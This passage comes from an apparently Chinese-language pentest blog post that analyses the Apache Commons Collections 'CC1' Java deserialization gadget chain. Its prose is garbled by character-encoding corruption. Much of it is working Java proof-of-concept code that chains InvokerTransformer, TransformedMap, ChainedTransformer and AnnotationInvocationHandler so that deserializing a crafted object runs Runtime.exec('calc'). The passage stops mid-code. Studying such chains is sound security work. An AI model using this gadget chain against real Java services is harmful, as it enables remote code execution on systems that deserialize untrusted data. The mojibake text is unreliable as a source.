<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨AbstractInputCheckedMapDecorator.MapEntry.setValue()ï¼Œåˆæ˜¯ä¸€ä¸ªå¯æ§å‚æ•°çš„ä¼ é€’ï¼Œè¿™é‡Œparentä¹Ÿæ˜¯å¯æ§çš„ï¼Œè€Œä¸”è¿™ä¸ªAbstractInputCheckedMapDecoratorç±»å…¶å®å°±æ˜¯TransformedMapçš„çˆ¶ç±»ï¼Œ<strong>æ›´å…³é”®çš„æ˜¯ï¼Œè¿™ä¸ªAbstractInputCheckedMapDecoratorç±»è¿˜å®ç°äº†Serializableçš„æ¥å£ï¼Œä¹Ÿå°±æ˜¯ç”±ä»–å®ä¾‹åŒ–çš„å¯¹è±¡æ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„</strong>ï¼Œè¿™é‡Œåšä¸ªæ ‡è®°</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp12.webp" alt="webp12"></p>
<p>æœ‰äº†è¿™ä¸ªMapEntryæ–¹æ³•ï¼Œæˆ‘ä»¬å°è¯•å†™ç¬¬äºŒä¸ªdemo</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jiangshiqi.xxx.CC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ­£å¸¸ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åŸå…ˆæ˜¯</span></span><br><span class="line">        <span class="comment">//new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(cmd);</span></span><br><span class="line">        InvokerTransformer invoker= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TransformedMap.decorateæ–¹æ³•è°ƒç”¨TransformedMapçš„æ„é€ æ–¹æ³•ã€‚</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invoker);</span><br><span class="line">        <span class="comment">//æ„é€ æ–¹æ³•æŠŠinvokerå®ä¾‹èµ‹å€¼ç»™TransformedMap.valueTransformerå±æ€§ã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//AbstractInputCheckedMapDecoratorç±»ä¸­çš„MapEntryç±»çš„setValue()æ–¹æ³•ï¼ˆä½œç”¨æ˜¯éå†mapï¼‰ è°ƒç”¨äº† TransformedMapç±»ä¸­çš„checkSetValue()æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">            entry.setValue(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//TransformedMapç±»ä¸­çš„checkSetValue()æ–¹æ³•è°ƒç”¨äº†TransformedMap.valueTransformer.transform(value)</span></span><br><span class="line">        <span class="comment">//ç›¸å½“äºinvoker.transform(value)ï¼Œvalueå°±æ˜¯ä¸Šé¢entry.setValue(cmd)æ–¹æ³•çš„å‚æ•°cmdã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­Map Entryéå†è¿‡ç¨‹çš„æ­¥éª¤</p>
<table>
<thead>
<tr>
<th>æ­¥éª¤</th>
<th>è°ƒç”¨é“¾</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>â‘ </td>
<td><code>transformedMap.entrySet()</code></td>
<td>è¿”å›ä¸€ä¸ªåŒ…è£…è¿‡çš„ EntrySet</td>
</tr>
<tr>
<td>â‘¡</td>
<td><code>iterator().next()</code></td>
<td>å¾—åˆ°ä¸€ä¸ª <code>MapEntry</code> å¯¹è±¡</td>
</tr>
<tr>
<td>â‘¢</td>
<td><code>entry.setValue(cmd)</code></td>
<td>è°ƒç”¨ <code>MapEntry.setValue()</code></td>
</tr>
<tr>
<td>â‘£</td>
<td><code>MapEntry.setValue()</code> â†’ <code>parent.checkSetValue(cmd)</code></td>
<td>è§¦å‘ transformer æ£€æŸ¥é€»è¾‘</td>
</tr>
<tr>
<td>â‘¤</td>
<td><code>TransformedMap.checkSetValue(cmd)</code> â†’ <code>valueTransformer.transform(cmd)</code></td>
<td>æ‰§è¡Œæ¶æ„ transformer</td>
</tr>
<tr>
<td>â‘¥</td>
<td><code>InvokerTransformer.transform(cmd)</code></td>
<td>è°ƒç”¨ <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code></td>
</tr>
</tbody></table>
<h2 id="ç¬¬ä¸‰æ­¥ï¼šAnnotationInvocationHandler-readObject"><a href="#ç¬¬ä¸‰æ­¥ï¼šAnnotationInvocationHandler-readObject" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šAnnotationInvocationHandler.readObject()"></a>ç¬¬ä¸‰æ­¥ï¼šAnnotationInvocationHandler.readObject()</h2><p>åœ¨ç¬¬äºŒæ­¥ä¸­æˆ‘ä»¬é‡‡ç”¨äº†éå†MapEntryæ¥æ‰§è¡ŒcheckSetValueï¼Œå¹¶é€šè¿‡valueTransformerå€¼ä¼ é€’ä»è€Œè°ƒç”¨åˆ°InvokerTransformerçš„transformï¼Œä½†åˆ°è¿™é‡Œè¿˜æ²¡æœ‰ç»“æŸï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ä¸€ç›´è·Ÿï¼ŒçŸ¥é“èƒ½æ‰¾åˆ°ä¸€ä¸ªæœ‰readObjectæ–¹æ³•åŒæ—¶åˆèƒ½è°ƒç”¨åˆ°ä¸åŒç±»çš„åŒåæ–¹æ³•ã€‚</p>
<p><code>AnnotationInvocationHandler</code>ç±»çš„<code>readObject()</code>æ–¹æ³•è°ƒç”¨äº†<code>setValue()</code>æ–¹æ³•ã€‚ç›´æ¥ä¸€æ­¥åˆ°ä½äº†ã€‚</p>
<p>å…¶å®è·Ÿåˆ°è¿™æˆ‘æ˜¯æ²¡æœ‰æƒ³åˆ°çš„ï¼Œä»€ä¹ˆç±»ç«Ÿç„¶èƒ½å¤Ÿåœ¨readObject()æ–¹æ³•ä¸­å®ç°è¿™ä¸ªsetValue()æ–¹æ³•ï¼Œå‘æ˜cc1é“¾çš„äººçœŸæ˜¯ä¸ªå¤©æ‰ï¼ä¸è¿‡ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªç±»ï¼Œè¿˜æ˜¯å¾—è®²æ¸…æ¥šã€‚</p>
<p>é¦–å…ˆï¼Œè¿™ä¸ªAnnotationInvocationHandlerç±»ä»–å¹¶æ²¡æœ‰è¢«publicå£°æ˜ï¼ˆä¹Ÿå°±æ˜¯defaultç±»å‹ï¼‰ï¼Œè€Œä¸”ä»–æ˜¯jdkçš„å†…éƒ¨ç±»ï¼Œå¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥å¾—éœ€è¦ç”¨åˆ°åå°„æ¥è¿›è¡Œè°ƒç”¨ã€‚</p>
<p>å…ˆæ˜ç¡®ä¸€ç‚¹ï¼š<br> CC1 é“¾çš„è§¦å‘èµ·ç‚¹ä¸æ˜¯ Commons Collections è‡ªå·±çš„ç±»ï¼Œè€Œæ˜¯ <strong>JDK è‡ªå¸¦çš„ç±»</strong>ï¼š<br> <code>sun.reflect.annotation.AnnotationInvocationHandler</code>ï¼ˆç®€ç§° AIHï¼‰ã€‚</p>
<p>å®ƒæ˜¯ä¸€ä¸ª <strong>åŠ¨æ€ä»£ç†æ³¨è§£çš„ InvocationHandler</strong>ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œ <code>readObject()</code>ï¼Œ<br> è€Œè¿™æ®µ <code>readObject()</code> ä¸­ï¼Œæœ‰è¿™æ ·ä¸€æ®µå…³é”®é€»è¾‘ğŸ‘‡</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (<span class="built_in">Map</span>.Entry&lt;<span class="built_in">String</span>, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">    <span class="params">...</span></span><br><span class="line">    memberValue.setValue(<span class="params">...</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š</p>
<ul>
<li><code>memberValues</code> æ˜¯ä¸€ä¸ª <code>Map</code>ï¼›</li>
<li><code>readObject()</code> åœ¨ååºåˆ—åŒ–æ—¶ä¼šéå†è¿™ä¸ª Mapï¼›</li>
<li>æ¯ä¸ª <code>entry</code> è°ƒç”¨äº† <code>setValue()</code>ï¼›</li>
<li>å¦‚æœè¿™ä¸ª Map è¢«æˆ‘ä»¬æ›¿æ¢æˆäº† <code>TransformedMap</code>ï¼ˆå¸¦æ¶æ„ Transformerï¼‰ï¼Œ<br> é‚£ä¹ˆå°±ä¼šè§¦å‘ <code>valueTransformer.transform(value)</code> â†’ æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li>
</ul>
<p>ğŸ’¥ è¿™å°±æ˜¯ CC1 é“¾è§¦å‘çš„åŸç†ã€‚</p>
<p>ä½†ä¸ç®¡æ€ä¹ˆè¯´è¿™ä¸ªAnnotationInvocationHandlerå°±æ˜¯å¾—åå°„è°ƒç”¨ï¼Œä¸ç„¶å°±ä¼šæŠ¥ç¼–è¯‘ä¸é€šè¿‡çš„é”™è¯¯ã€‚<img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp12-1762664313167-35.webp" alt="webp12"></p>
<p>çœ‹åˆ°ä»–æœ‰è°ƒç”¨è¿™ä¸ªsetValueæ–¹æ³•</p>
<p>æ¥ç€æˆ‘ä»¬æ¥çœ‹ä»–çš„æ„é€ æ–¹æ³•</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp13.png" alt="webp13"></p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Classå¯¹è±¡ï¼ˆçœ‹åå­—å¯èƒ½è·Ÿæ³¨è§£æœ‰å…³ï¼Œå…¶å®å°±æ˜¯ç»§æ‰¿äº†Annotationï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªæ³¨è§£ç±»ï¼Œæ¯”å¦‚Override.classç­‰ï¼‰ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯Mapå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´åˆ°çš„transformedmapã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line">annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åå°„è°ƒç”¨AnnotationInvocationHandlerçš„æ„é€ å™¨</p>
<p>æ‰€ä»¥ç›®å‰æ”»å‡»é“¾å·²ç»åˆæ­¥æˆå‹äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//æ­£å¸¸ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invoker);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationConstructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> annotationConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        serialize(obj);  <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser1.bin&quot;</span>); <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡ç°åœ¨ä»æœ‰å‡ ä¸ªé—®é¢˜</p>
<h4 id="1ã€EXPä¸­Runtimeå¯¹è±¡cmdå› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œä¸å¯ä»¥è¢«åºåˆ—åŒ–ã€‚"><a href="#1ã€EXPä¸­Runtimeå¯¹è±¡cmdå› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œä¸å¯ä»¥è¢«åºåˆ—åŒ–ã€‚" class="headerlink" title="1ã€EXPä¸­Runtimeå¯¹è±¡cmdå› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œä¸å¯ä»¥è¢«åºåˆ—åŒ–ã€‚"></a>1ã€EXPä¸­Runtimeå¯¹è±¡<code>cmd</code>å› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿<code>Serializable</code>æ¥å£ï¼Œä¸å¯ä»¥è¢«åºåˆ—åŒ–ã€‚</h4><p>è™½ç„¶Runtimeçš„å¯¹è±¡ä¸å¯è¢«åºåˆ—åŒ–ï¼Œä½†æ˜¯classèƒ½è¢«åºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é€šè¿‡åå°„è°ƒç”¨Runtime.class</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp14.png" alt="webp14"></p>
<p>åå°„è°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨åå°„ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">cmdMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">cmdMethod.invoke(cmd, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…¶å®ç­‰åŒäºä¸‹é¢Invokertransformerçš„è°ƒç”¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line"><span class="comment">//Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRunmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Runtime cmd = (Runtime) getRuntimeMethod.invoke(null, null);</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRunmethod);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp15.webp" alt="webp15"></p>
<p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹å‚æ•°ç±»å‹å’Œå‚æ•°çš„è°ƒç”¨å³å¯ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·å†…çš„ä¸‰ä¸ªå‚æ•°æ˜¯ Invokertransformerç±»çš„æ„é€ å‡½æ•°çš„å‚æ•°ã€‚ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°Stringä»£è¡¨ä½ éœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œç¬¬äºŒä¸ªå‚æ•°new Class[]æ•°ç»„ä»£è¡¨ä½ æ–¹æ³•éœ€è¦çš„å‚æ•°ç±»å‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°new Object[]æ•°ç»„ä»£è¡¨æ–¹æ³•å‚æ•°çš„å…·ä½“å€¼</p>
<p>ç¬¬äºŒä¸ªæ‹¬å·å†…çš„ä¸€ä¸ªå‚æ•°æ˜¯ Invokertransformerç±»çš„transformæ–¹æ³•çš„å‚æ•°ã€‚è¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªç±»ï¼Œæ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•°ä½œä¸ºè¿™ä¸ªç±»è°ƒç”¨çš„æ–¹æ³•ï¼Œé€»è¾‘è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä¸è¿‡è¿˜æ˜¯å»ºè®®è‡ªå·±å†™ä¸€ä¸‹ã€‚</p>
<p>ä½†æ˜¯ç”±äºæˆ‘ä»¬è¿™æ ·åˆ†æˆäº†InvokerTransformerçš„å®ä¾‹ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æˆ‘ä»¬åœ¨expçš„ç¼–å†™æ—¶ï¼Œä¸çŸ¥é“è¦è°ƒç”¨å…·ä½“å“ªä¸€ä¸ªInvokerTransformerå¯¹è±¡ï¼Œäºæ˜¯æˆ‘ä»¬å°±è¦æƒ³åŠæ³•çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾ä¸€ä¸ªæ–¹æ³•æŠŠ<strong>InvokerTransformer.transform()çš„è°ƒç”¨ç»Ÿä¸€èµ·æ¥</strong></p>
<p>è¿˜è®°å¾—å‰é¢è¯´çš„é‚£ä¸ªChainedTransformerå—ï¼Œä»–å°±æ˜¯æˆ‘ä»¬çš„å…³é”®åˆ©ç”¨ç‚¹</p>
<p><img src="/.io//pentest-notes\blog\blog\source_posts\javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ.assets\webp16.png" alt="webp16"></p>
<p>å¯ä»¥çœ‹åˆ°ChainedTransformerä¸­æœ‰ä¸€ä¸ªtransformæ–¹æ³•ï¼Œå®ƒå¯ä»¥å¯¹ä¼ å…¥çš„objecté€’å½’åœ°å»è°ƒç”¨transform()æ–¹æ³•ï¼Œè€Œä¸”objectä¹Ÿå¯æ§</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Method getRunmethod = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//Runtime cmd = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRunmethod);</span></span><br><span class="line"><span class="comment">//new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(cmd);</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformerArray=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformerArray);</span><br><span 